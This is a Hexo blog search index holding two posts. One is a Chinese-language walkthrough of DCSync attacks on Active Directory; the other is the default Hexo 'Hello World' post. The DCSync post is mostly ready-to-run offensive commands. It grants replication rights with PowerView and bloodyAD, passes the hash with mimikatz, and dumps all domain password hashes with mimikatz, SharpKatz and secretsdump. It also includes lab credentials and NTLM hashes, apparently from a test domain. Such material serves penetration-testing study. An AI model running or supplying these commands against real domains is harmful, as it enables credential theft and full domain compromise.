<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/08/10/dcsync%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/10/dcsync%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>title: my blog</p><h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>获得以下任一用户的权限：</p><ul><li>Domain Admins组内的用户</li><li>Administrators组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>默认只有域控主机账号和域管理员能进行Dcsync，其机器账号拥有WriteACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制目录更改（DS-Replication-Get-Changes）</span><br><span class="line"></span><br><span class="line">全部复制目录更改 (DS-Replication-Get-Changes-All )</span><br></pre></td></tr></table></figure><h1 id="查寻存在DCSync权限的账户"><a href="#查寻存在DCSync权限的账户" class="headerlink" title="查寻存在DCSync权限的账户"></a>查寻存在DCSync权限的账户</h1><h2 id="域控查看"><a href="#域控查看" class="headerlink" title="域控查看"></a>域控查看</h2><p>上帝视角先了解一下这几个权限的位置，打开AD管理中心，又键域名，属性</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688542032410-c6edd7c5-a710-4840-b97c-d0e1c9d030ac.png"></p><h2 id="adfind"><a href="#adfind" class="headerlink" title="adfind"></a>adfind</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute</span><br><span class="line"></span><br><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes All&quot;;; -recmute</span><br></pre></td></tr></table></figure><p> <img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688539957867-9defb97a-e336-41fa-a350-c86a673570cc.png"></p><h1 id="给特定用户赋予DCSync权限"><a href="#给特定用户赋予DCSync权限" class="headerlink" title="给特定用户赋予DCSync权限"></a>给特定用户赋予DCSync权限</h1><h2 id="powerview-ps1"><a href="#powerview-ps1" class="headerlink" title="powerview.ps1"></a>powerview.ps1</h2><p>使用hash传递跳出的新cmd弹窗，或在我们控制的域机器上登录拥有赋予dcsync权限（域管，或域管机器用户）用户，执行以下命令达到远程赋予dcsync的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">更改默认策略，使得脚本可以执行：</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">或</span><br><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line"></span><br><span class="line">导入脚本：</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">将指定用户写入DCSync：</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下写入：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity haha -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">删除指定用户的DCSync:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下删除：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity test -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">查询具有DCSync权限的用户：</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes&quot;&#125;</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;Replicating Directory Changes&quot;&#125; </span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes-All&quot;&#125;</span><br><span class="line"></span><br><span class="line">查询用户的ACL:</span><br><span class="line">Get-DomainObjectAcl -Identity guan1 -domain guan.com -ResolveGUIDs</span><br></pre></td></tr></table></figure><p>赋予过程：</p><p>用域管远程登录控制的域机器：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982125103-46943000-65de-45ab-a253-4e982f151eec.png"></p><p>为域用户guan1赋予dcsync权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982179615-ce32079e-4f8c-4b06-b91b-8b523a775e8e.png"></p><p>查询结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982333198-11733d5d-99c4-45a6-92d1-22bec309254e.png"></p><p>查看用户guan1的访问控制列表</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982453962-9d6a906c-0164-44c4-b5d9-35648f762d5e.png"></p><h2 id="bloodyAD-py"><a href="#bloodyAD-py" class="headerlink" title="bloodyAD.py"></a>bloodyAD.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看帮助文档</span><br><span class="line">python3 bloodyAD.py -h</span><br><span class="line">python3 bloodyAD.py add -h</span><br><span class="line">python3 bloodyAD.py add dcsync -h</span><br><span class="line"></span><br><span class="line">知道账户密码：</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p Hack@12 --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">知道账户hash:</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p :690f662f7f12700eae9e1c65dcd648be --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">删除dcsync：将add改为remove即可</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  &#123;add,get,remove,set&#125;</span><br><span class="line">    add                 [ADD] function category</span><br><span class="line">    get                 [GET] function category</span><br><span class="line">    remove              [REMOVE] function category</span><br><span class="line">    set                 [SET] function category</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315265810-cc5ccfa2-1828-4c4d-bb40-67fa091b73e1.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315246685-3214540d-ae6b-4131-90b1-2dafa5bf0397.png"></p><p><strong>验证</strong></p><p><strong>1）建立代理</strong></p><p><strong>2）hash传递目标域用户</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321628111-60367138-569b-4d05-9c6f-f016462df7e5.png"></p><p>3）SharpKatz.exe利用目标账户的dcsync功能导出域所有hash（mimikatz不能远程导出，无法指定域）</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321710504-826ade1b-995b-42c7-8216-782563908a73.png"></p><p>4）成功</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321862196-7a7fadea-000b-4c01-8d79-c1e902af8cd2.png"></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>（环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作）</p><p>前提，已经通过上述步骤为所控制的域用户赋予DCSync权限</p><p>将mimitakz上传到我们完全控制的域机器，远程登录（该域用户也是本地管理员）</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688997617863-67a87615-a827-4d4b-a8cc-b5cae6863ed3.png"></p><p>直接用以下命令导出域hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h2 id="dc-hash传递"><a href="#dc-hash传递" class="headerlink" title="dc$ hash传递"></a>dc$ hash传递</h2><p>(环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作)</p><p>验证证初始环境</p><p>mimikatz使用dcsync功能导出hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>失败报错，当前域用户没有dcsync权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562663286-8e21ee82-045a-423a-9c7d-eb9e411108e4.png"></p><p>先拿到DC$ 的hash</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562356812-cfbac079-0c06-4037-bdac-eaa40d088ff3.png"></p><p>利用mimikatz 进行hash传递获得注入dc$后的命令窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:dc$ /domain:guan.com /ntlm:963acb058f2fd451a689d86b51739fe1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562822915-0b5d5e8e-5a38-4e8d-af81-70324577f00a.png"></p><p>再次实践，mimikatz使用dcsync功能导出hash</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998111140-4d2eab5e-450c-4e48-a2df-b33bae8f875a.png"></p><p>尝试在此窗口下加载powerview脚本将dcsync 权限赋给guan1</p><p>失败，可能dc$没有这个权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998216159-09346049-e7bc-440e-b19e-c9be96295d2e.png"></p><p>尝试用域管的hash进行hash传递，验证是否真的是dc$账户没有赋予dcsync的权限，还是说是远程登录相关限制的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:guan.com /ntlm:3642639123c37049ac21e1d12b39eb17&quot;</span><br></pre></td></tr></table></figure><p>域管的hash传递可以成功赋予</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998621580-69b4cb09-0128-4819-ba14-fd0c15f5967c.png"></p><p>确认是dc$只是有dcsync这个功能，但并没有赋予其它域用户这个功能的权限</p><h2 id="Sharpkatz"><a href="#Sharpkatz" class="headerlink" title="Sharpkatz"></a>Sharpkatz</h2><p>（先通过socks代理使得外域机能联系域内主机，使用proxifier）</p><p>以用域管账户密码导出krbtgt为例（域管默认有dcsync这个权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SharpKatz.exe --Command dcsync --User krbtgt --Domain guan.com --DomainController 10.10.10.60 --AuthUser administrator --AuthDomain Guan.com --AuthPassword Guan207566903</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sharekatz.exe -h 查看帮助文档</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002057974-be26b00f-ceab-47e1-94ed-80c516707b2d.png"></p><h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知道账户密码</span><br><span class="line">proxychains3 python3 secretsdump.py GUAN/administrator:Guan207566903@10.10.10.60</span><br><span class="line"></span><br><span class="line">知道账户hash</span><br><span class="line">proxychains3 python3 secretsdump.py -hashes :3642639123c37049ac21e1d12b39eb17 GUAN/administrator@10.10.10.60</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002527669-343a90be-07af-470a-976e-c593af58b4e9.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002757841-43d5f596-ebad-4984-aaa2-f417ec20ffa9.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/10/hello-world/"/>
      <url>/2024/08/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
